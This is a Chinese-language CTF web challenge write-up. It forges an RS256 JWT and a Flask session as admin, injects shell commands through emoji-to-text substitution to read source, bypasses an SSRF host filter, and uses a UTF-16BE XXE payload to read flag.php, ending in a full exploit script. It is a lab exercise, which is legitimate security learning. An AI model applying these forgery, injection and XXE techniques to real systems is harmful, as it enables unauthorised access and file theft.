tags:: [[CTFWEB/JWT]], [[CTFWEB/XXE]]

- # 伪造jwt密钥
	- 看到这篇文章，跟着做得到jwt的rsa公钥私钥
		- https://ctftime.org/writeup/30541
	- 写代码伪造jwt
		- ```python
		  import jwt # pip install PyJWT
		  from datetime import datetime, timedelta
		  
		  # RSA 密钥对
		  private_key = """-----BEGIN RSA PRIVATE KEY-----
		  MIICoQIBAAKBgSSlUMfCzg/ysG4ixoi6NKGuWNnvIpZZTRNa045eH2xzzY/ZyRwD
		  ojStMH5wxG6nOVvNAY/ETx2XPPC6J1J//nzC1fANMNCYRa47xIW0RwZBDSABcGnw
		  u3QP2nr7AR0/tZmSClncdwA7RKzlJM8Fs7Zmb502ZMSv0AxMgN5UMh9FCwIDAQAB
		  AoGBC5/r+nCv2+uWXTjL8i6UJtLIfdOssxKbJNiIKLXQh3l8IAAfx1i9ktxYEICW
		  TcGTUkx9gjd+xUwo0KOKjcg3hZc7bEfLkiOsK8dSwsPFEXYQpCE1EFokhkc9Rbiq
		  URC9QIrQjtzf5vdU2usj5ddRGtqtmpXm/ibU1TLPIsy8Y5TJAoGBAP2Mj8b+pnwu
		  SCp0EYh99ogr6jblQlVwySv34UDQarcFjkQoB60SOMZpGCyPr/auhfDIsNvKyXLK
		  S7IBEBFMETWywUx28OGFV7xtGF7RfLWmaKYXy4ML/DfHonV8khZ6h5wpyxPL3Wli
		  uJCSSsjNgXhj4aeGLtRRuySpiXflrdFvAgElAoGBALrhzOO+tJWZQ2XPMVEqjvjl
		  bXfS2WbCf/Theuzb8Zw/AxJncuj1IlXUBpZpvigTkPPd6MXIHV13j/1+3QnyyEiN
		  Hf6vOHLxZq6itrDEtafqJP4vUbigr+GpSqxQChl5bNUE1QMdY3AW7LTarzZ8iq5i
		  6GMi+wdRyp+GOqXd65UPAgERAoGAUjts5pfHSt6T8hfOVcf87eS6qgUqRTlWAGwR
		  tCfrQkb9tT1qRfgSadzlPuJ+QirDqAm80amNcVZdvTDG8NpmckfP/R+oEcphpOUc
		  qSFY4PezPMlyb7DcLcQ0sHttpmztthtkdR+GFFdedBPFOjTQC16qDNGSpbmkepfZ
		  jqta99E=
		  -----END RSA PRIVATE KEY-----"""
		  
		  public_key = """-----BEGIN RSA PUBLIC KEY-----
		  MIGJAoGBJKVQx8LOD/KwbiLGiLo0oa5Y2e8illlNE1rTjl4fbHPNj9nJHAOiNK0w
		  fnDEbqc5W80Bj8RPHZc88LonUn/+fMLV8A0w0JhFrjvEhbRHBkENIAFwafC7dA/a
		  evsBHT+1mZIKWdx3ADtErOUkzwWztmZvnTZkxK/QDEyA3lQyH0ULAgMBAAE=
		  -----END RSA PUBLIC KEY-----
		  """
		  
		  # JWT 负载
		  payload = {
		    "username": "admin"
		  }
		  
		  # 生成 JWT
		  token = jwt.encode(payload, private_key, algorithm='RS256')
		  
		  print("Generated JWT:", token)
		  
		  # 验证 JWT
		  try:
		      decoded_payload = jwt.decode(token, public_key, algorithms=['RS256'])
		      print("Decoded payload:", decoded_payload)
		  except jwt.ExpiredSignatureError:
		      print("Token has expired")
		  except jwt.InvalidTokenError:
		      print("Invalid token")
		  
		  ```
	- 伪造的jwt
		- ```text
		  Generated JWT: eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.DNqIFNdFOWgGGnuk95SQa5GdU_D6TDv95lTU97wUP8ekgqX6zrnvvsnp8XkvVfSx0g3xVQqbo5xhdxjNpM8LiiwX_kQ8FO8t0q0qBn1RJ5O2bGkGOZsUWAUrKg7ME6L4-XFiXi7P328f1t4En_kSp91SeS7-9Lcn7Ja__IJbRuH1
		  
		  ```
- # 获取python源代码
	- 游戏界面内容，输入emoji之后发现emoji被换成了对应的文本
		- ```
		  Enter emoji and you can execute it.
		  
		  Dou U know 😀😉😊😋😎🤔😐😥😮🤐😯😪😫😴😜😝😒🙃😲☹️🙁😖😞😤😢😦😰😱🤪😵🥴😠😡🤕🤢🤮🤧😇🥳🥺🤡🤠🤥🐶🐱🐭🐰🦊🐷🐽🐸🐒🐔🐧🐦🚗🚕🚁⭐🛶⛵🚤🛳️⛴️🛥️🚢👶💿📀📱💻⏰🕰️⌚📡🔋🔌🚩✖️➗?
		  ```
	- 有些emoji是有用的
		- 🐱: cat
		- 💿: cd
		- ⭐: `*`通配符
		- 🚩: flag
		- 😜: 里面有分号
		- 😐: 里面有`|`
	- 试着读文件
		- `🐱 ⭐`可以读到emoji对应的字符，看到有`flag`文件夹
		  collapsed:: true
			- ```python
			  emoji_table = {
			          "😀": ":D",
			          "😉": ";)",
			          "😊": ":)",
			          "😋": ":P",
			          "😎": "B)",
			          "🤔": ":?",  
			          "😐": ":|",
			          "😥": ":'(",
			          "😮": ":o",
			          "🤐": ":x",
			          "😯": ":o",
			          "😪": ":'(",
			          "😫": ">:(",
			          "😴": "Zzz",
			          "😜": ";P",
			          "😝": "XP",
			          "😒": ":/",
			          "🙃": "(:",
			          "😲": ":O",
			          "☹️": ":(",
			          "🙁": ":(",
			          "😖": ">:(",
			          "😞": ":(",
			          "😤": ">:(",
			          "😢": ":'(",
			          "😦": ":(",
			          "😰": ":(",
			          "😱": ":O",
			          "🤪": ":P",
			          "😵": "X(",
			          "🥴": ":P",
			          "😠": ">:(",
			          "😡": ">:(",
			          "🤕": ":(",
			          "🤢": "X(",
			          "🤮": ":P",
			          "🤧": ":'(",
			          "😇": "O:)",
			          "🥳": ":D",
			          "🥺": ":'(",
			          "🤡": ":o)",
			          "🤠": "Y)",
			          "🤥": ":L",
			          "🐶": "dog",
			          "🐱": "cat",  
			          "🐭": "mouse",
			          "🐰": "rabbit",
			          "🦊": "fox",
			          "🐷": "pig",
			          "🐽": "pig nose",
			          "🐸": "frog",
			          "🐒": "monkey",
			          "🐔": "chicken",
			          "🐧": "penguin",
			          "🐦": "bird",
			          "🚗": "car",
			          "🚕": "taxi",
			          "🚁": "helicopter",
			          "🛶": "canoe",
			          "⛵": "sailboat",
			          "🚤": "speedboat",
			          "🛳️": "passenger ship",
			          "⛴️": "ferry",
			          "🛥️": "motor boat",
			          "🚢": "ship",
			          "👶": "baby",
			          "💿": "CD",
			          "📀": "DVD",
			          "📱": "phone",
			          "💻": "laptop",
			          "⏰": "alarm clock",
			          "🕰️": "mantelpiece clock",
			          "⌚": "watch",
			          "📡": "satellite antenna",
			          "🔋": "battery",
			          "🔌": "plug",
			          "🚩": "flag",
			          "⭐": "*",
			          "✖️": "×",
			          "➗": "÷",
			          "flag": "flag.php",
			  }
			  ```
		- `💿 🚩😜 😐🐱 ⭐`就是`cd flag ;p :|cat *`可以读`flag`文件夹下所有文件，^^拿到源代码^^
- # 伪造flask session
	- 源代码里有flask session的secret
	- 用`flask_unsign`对着源代码伪造flask sesison
		- ```shell
		  python -m flask_unsign -s -c "{'csrf_token': 'd383f3f6a04205f11961176b79d9cb435cca7193', 'role': 'admin'}" --secret '36f8efbea152e50b23290e0ed707b4b0'
		  eyJjc3JmX3Rva2VuIjoiZDM4M2YzZjZhMDQyMDVmMTE5NjExNzZiNzlkOWNiNDM1Y2NhNzE5MyIsInJvbGUiOiJhZG1pbiJ9.ZyCbnw.aDTbVLIpWBVW7niFNMgb7OI--EM
		  ```
- # SSRF+XXE
	- 首先绕ssrf
		- ssrf需要域名里有`www.testctf.com`，而且不能含有`127.0.0.1`
			- 用`www.testctf.com:a`将域名变成用户名
			- 用`127.0.0.2`代替`127.0.0.1`
		- 最后填入的域名为`www.testctf.com:a@127.0.0.2`
	- 然后做xxe
		- 发现这个文件上传可以触发php端读取xml文件
		- 用`utf16-be`绕过waf, 然后利用xxe做文件读取
		  id:: 6720a4bd-9205-4b92-ae10-7d1018bc6691
			- ```python
			  content = b"<?xml version=\"1.0\" encoding=\"utf-16be\"" + """?>
			  <!DOCTYPE testtest [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=file:///var/www/html/flag.php">  ]>
			  <user><username>&xxe;</username><password>admin</password></user>
			  """.encode("utf-16be")
			  
			  ```
	- 这部分完整代码
		- ```python
		  import requests
		  
		  
		  cookies = {
		      "session": "eyJjc3JmX3Rva2VuIjoiZDM4M2YzZjZhMDQyMDVmMTE5NjExNzZiNzlkOWNiNDM1Y2NhNzE5MyIsInJvbGUiOiJhZG1pbiJ9.ZyCdEA.sgiEumbM_USZo-ft-j3RLwp2UQw",
		      "token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.DNqIFNdFOWgGGnuk95SQa5GdU_D6TDv95lTU97wUP8ekgqX6zrnvvsnp8XkvVfSx0g3xVQqbo5xhdxjNpM8LiiwX_kQ8FO8t0q0qBn1RJ5O2bGkGOZsUWAUrKg7ME6L4-XFiXi7P328f1t4En_kSp91SeS7-9Lcn7Ja__IJbRuH1",
		  }
		  
		  content = b"<?xml version=\"1.0\" encoding=\"utf-16be\"" + """?>
		  <!DOCTYPE testtest [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=file:///var/www/html/flag.php">  ]>
		  <user><username>&xxe;</username><password>admin</password></user>
		  """.encode("utf-16be")
		  
		  files = {
		      "csrf_token": (
		          None,
		          "ImQzODNmM2Y2YTA0MjA1ZjExOTYxMTc2Yjc5ZDljYjQzNWNjYTcxOTMi.ZyCd8Q.UAhca7G2qiJmVZ6YI7XX6YUwuvk",
		      ),
		      "avatar": ("a.php", content, "image/jpg"),
		      "submit": (None, "Upload"),
		  }
		  
		  response = requests.post(
		      "http://0192d5cd65a17e5597f29036ffe3123f.ze2a.dg04.ciihw.cn:43358/upload",
		      cookies=cookies,
		      files=files,
		  )
		  
		  path = re.search(
		      "successfully uploaded to (/var/www/html/uploads/.+)\\.", response.text
		  ).group(1)
		  print(f"{path=}")
		  
		  
		  
		  data = {
		      "csrf_token": "ImQzODNmM2Y2YTA0MjA1ZjExOTYxMTc2Yjc5ZDljYjQzNWNjYTcxOTMi.ZyCdGw._xwbWkr-zS9f9zNbFfsR6XOT5S4",
		      "path": "www.testctf.com:a@127.0.0.2",
		      "user_input": path,
		      "submit": "Submit",
		  }
		  
		  response = requests.post(
		      "http://0192d5cd65a17e5597f29036ffe3123f.ze2a.dg04.ciihw.cn:43358/view_uploads",
		      cookies=cookies,
		      data=data,
		  )
		  bs = BeautifulSoup(response.text)
		  try:
		      print(bs.select("p")[-1].text)
		  except Exception:
		      print(response.text)
		  
		  ```